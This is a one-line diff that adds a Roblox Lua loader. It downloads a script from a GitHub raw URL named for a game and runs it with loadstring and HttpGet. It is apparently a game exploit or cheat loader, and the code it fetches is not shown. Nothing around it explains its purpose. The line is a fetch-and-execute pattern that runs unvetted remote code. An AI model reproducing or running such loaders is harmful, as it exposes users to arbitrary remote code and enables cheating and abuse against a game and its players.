@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/build-a-phone-empire-spam1-87697zpjo7557i.lua"))()
